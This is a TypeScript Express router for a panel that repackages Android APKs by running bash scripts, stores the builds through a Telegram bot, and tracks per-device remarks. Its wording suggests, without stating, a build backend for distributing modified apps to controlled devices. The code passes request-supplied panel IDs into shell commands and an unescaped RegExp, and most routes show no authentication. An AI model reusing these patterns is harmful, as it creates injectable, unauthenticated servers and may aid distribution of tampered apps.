// Generate shoot APK without VPN
router.post(["/shoot-novpn/generate", "/admin/shoot-novpn/generate"], async (req: Request, res: Response) => {
  try {
    const panelId = clean(req.body?.panelId || process.env.PANEL_ID || "");
    if (!panelId) return res.status(400).json({ error: "panelId required" });
    const conn       = await getBotDb();
    const PanelModel = getBotPanelModel(conn);
    const panel      = await PanelModel.findOne({ panelId: { $regex: new RegExp(`^${panelId}$`, "i") } }).lean() as any;
    if (!panel) return res.status(404).json({ error: `Panel "${panelId}" not found` });
    if (!panel.apkFileId) return res.status(400).json({ error: "Pehle Telegram bot se release APK upload karo." });
    const fileId    = String(panel.apkFileId);
    const chatId    = process.env.ADMIN_CHAT_ID || process.env.STORAGE_CHAT_ID || "";
    const BOT_TOKEN = process.env.BOT_TOKEN || "";
    if (!chatId)    return res.status(500).json({ error: "ADMIN_CHAT_ID ya STORAGE_CHAT_ID .env mein set nahi hai" });
    if (!BOT_TOKEN) return res.status(500).json({ error: "BOT_TOKEN .env mein set nahi hai" });
    const requestId = genRequestId();
    repackJobs.set(requestId, { status: "running", panelId, createdAt: Date.now() });
    const scriptPath = "/root/second-bot/repack/repack_novpn.sh";
    const selfUrl = process.env.SELF_RESOLVE_URL || `http://localhost:${process.env.PORT || 3000}`;
    const apiKey  = process.env.ADMIN_API_KEY || process.env.API_KEY || "";
    const cmd = `bash "${scriptPath}" "${fileId}" "${chatId}" "${requestId}" "${panelId}" "" "" "${selfUrl}" "${apiKey}" 2>&1`;
    logger.info("shoot-novpn-generate: starting", { requestId, panelId });
    exec(cmd, { timeout: 5 * 60 * 1000 }, (err, stdout) => {
      const job = repackJobs.get(requestId);
      if (err) {
        logger.error("shoot-novpn-generate: script error", { requestId, error: err.message, stdout: stdout?.slice(0, 200) });
        if (job?.status === "running") repackJobs.set(requestId, { ...job, status: "error", error: "Repack script fail ho gaya." });
      } else {
        logger.info("shoot-novpn-generate: script done", { requestId, stdout: stdout?.slice(0, 100) });
        setTimeout(() => { const j = repackJobs.get(requestId); if (j?.status === "running") repackJobs.set(requestId, { ...j, status: "error", error: "Script complete hua par resolve nahi mila" }); }, 10000);
      }
    });
    return res.json({ requestId });
  } catch (err: any) {
    logger.error("shoot-novpn-generate: failed", err);
    return res.status(500).json({ error: err?.message || "server error" });
  }
});

/**
 * =====================================
 * DEVICE REMARKS
 * =====================================
 */
router.get(["/device-remarks", "/admin/device-remarks"], async (_req, res) => {
  try {
    const docs = await AdminModel.find({ key: { $regex: /^device_remark_/ } }).lean();
    const map: Record<string, string> = {};
    for (const doc of docs) {
      const deviceId = String((doc as any).key || "").replace("device_remark_", "");
      const remark = String((doc as any)?.meta?.remark || "");
      if (deviceId && remark) map[deviceId] = remark;
    }
    return res.json(map);
  } catch { return res.status(500).json({}); }
});

router.put(["/device-remark/:deviceId", "/admin/device-remark/:deviceId"], async (req, res) => {
  const deviceId = String(req.params.deviceId || "").trim();
  const remark = String(req.body?.remark || "").trim();
  if (!deviceId) return res.status(400).json({ success: false, error: "deviceId required" });
  try {
    const key = `device_remark_${deviceId}`;
    if (remark) {
      await AdminModel.findOneAndUpdate({ key }, { $set: { phone: key, meta: { remark } } }, { upsert: true, new: true });
    } else {
      await AdminModel.deleteOne({ key });
    }
    return res.json({ success: true });
  } catch (err: any) { return res.status(500).json({ success: false, error: err?.message }); }
});

/**
 * =====================================
 * ADMIN APK DOWNLOAD ROUTES
 * =====================================
 */
router.post(["/download-admin-apk", "/admin/download-admin-apk"], async (req: Request, res: Response) => {
  try {
    const panelId = clean(req.body?.panelId || process.env.PANNEL_ID || process.env.PANEL_ID || "");
    if (!panelId) return res.status(400).json({ success: false, error: "panelId required" });
    const selfUrl = clean(process.env.SELF_RESOLVE_URL || "");
    if (!selfUrl) return res.status(400).json({ success: false, error: "SELF_RESOLVE_URL not configured in .env" });
    const wsBase = selfUrl.replace(/^https:\/\//, "wss://").replace(/^http:\/\//, "ws://") + "/ws";
    const expiryRaw = clean(process.env.LICENSE_EXPIRY || "");
    let renewalStartDate = expiryRaw || (() => { const now = new Date(); return `${String(now.getDate()).padStart(2,"0")}/${String(now.getMonth()+1).padStart(2,"0")}/${now.getFullYear()}`; })();
    const requestId = `admin_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
    adminApkJobs.set(requestId, { status: "pending", panelId, createdAt: Date.now() });
    const scriptPath = "/root/second-bot/repack/admin_repack.sh";
    const cmd = `bash "${scriptPath}" "${panelId}" "${selfUrl}" "${wsBase}" "${renewalStartDate}" "30" "${requestId}" 2>&1`;
    logger.info("admin-apk: starting", { requestId, panelId, selfUrl });
    exec(cmd, { timeout: 5 * 60 * 1000 }, (err, stdout) => {
      const job = adminApkJobs.get(requestId);
      if (err) {
        logger.error("admin-apk: script error", { requestId, error: err.message, stdout: stdout?.slice(0, 300) });
        if (job?.status === "pending") adminApkJobs.set(requestId, { ...job, status: "error", error: "Admin APK build fail ho gaya." });
        return;
      }
      const fileId = stdout.trim().split("\n").pop()?.trim() || "";
      if (fileId && fileId.length > 10) {
        adminApkJobs.set(requestId, { status: "done", fileId, panelId, createdAt: job?.createdAt || Date.now() });
        logger.info("admin-apk: done", { requestId, fileId: fileId.slice(0, 20) });
      } else {
        adminApkJobs.set(requestId, { ...job!, status: "error", error: "APK build hua par fileId nahi mila" });
      }
    });
    return res.json({ success: true, requestId });
  } catch (e: any) {
    logger.error("admin-apk: route error", e);
    return res.status(500).json({ success: false, error: e?.message || "Internal error" });
  }
});

router.get(["/download-admin-apk/:requestId/status", "/admin/download-admin-apk/:requestId/status"], (req: Request, res: Response) => {
  const job = adminApkJobs.get(req.params.requestId);
  if (!job) return res.status(404).json({ success: false, error: "Request not found" });
  return res.json({ success: true, status: job.status, error: job.error });
});

router.get(["/download-admin-apk/:requestId/download", "/admin/download-admin-apk/:requestId/download"], async (req: Request, res: Response) => {
  const job = adminApkJobs.get(req.params.requestId);
  if (!job) return res.status(404).json({ success: false, error: "Request not found" });
  if (job.status !== "done" || !job.fileId) return res.status(400).json({ success: false, error: "APK not ready", status: job.status });
  const BOT_TOKEN = process.env.BOT_TOKEN || "";
  if (!BOT_TOKEN) return res.status(500).json({ success: false, error: "BOT_TOKEN not configured" });
  try {
    const filePath = await tgGetFilePath(BOT_TOKEN, job.fileId);
    const filename = `admin-panel-${job.panelId}.apk`;
    res.setHeader("Content-Type", "application/vnd.android.package-archive");
    res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
    https.get(`https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`, (fileStream) => {
      fileStream.pipe(res);
      fileStream.on("error", (_err: Error) => { if (!res.headersSent) res.status(500).end(); });
    }).on("error", (_err: Error) => { if (!res.headersSent) res.status(500).json({ error: "Download failed" }); });
  } catch (err: any) { if (!res.headersSent) res.status(500).json({ success: false, error: err?.message }); }
});

router.post(["/admin-apk/:requestId/resolve", "/admin/admin-apk/:requestId/resolve"], (req: Request, res: Response) => {
  const adminKey = String(req.headers["x-admin-key"] || "").trim();
  if (!adminKey || adminKey !== process.env.ADMIN_API_KEY) return res.status(401).json({ error: "unauthorized" });
  const { requestId } = req.params;
  const { fileId, panelId } = req.body || {};
  const existing = adminApkJobs.get(requestId);
  if (fileId) {
    adminApkJobs.set(requestId, { ...(existing || { createdAt: Date.now(), panelId: panelId || "" }), status: "done", fileId: clean(fileId), panelId: clean(panelId) || existing?.panelId || "" });
    logger.info("admin-apk: resolved via bot", { requestId, fileId: String(fileId).slice(0, 20) });
  }
  return res.json({ ok: true });
});

export default router;
